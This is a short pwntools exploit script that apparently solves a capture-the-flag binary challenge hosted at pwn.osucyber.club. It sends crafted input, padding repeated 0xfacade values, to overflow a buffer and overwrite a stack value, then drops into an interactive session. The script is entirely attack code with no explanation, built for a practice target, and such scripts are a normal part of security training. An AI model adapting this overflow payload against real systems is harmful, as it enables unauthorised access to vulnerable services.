from pwn import *

EXE = ELF("./challenge/chall_1")
breakpoints = [
	"break *0x00100835"
]
context.binary = EXE
context.terminal = ['xterm', '-e']
context.log_level = "DEBUG"

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13371)
	return r

r = conn(False)
r.recvline()

padding = p32(0xfacade)*22
package = p32(0xfacade)+b'\n'

r.send(b'a'*17+b'\n')
r.send(padding+package)
r.interactive()

r.close()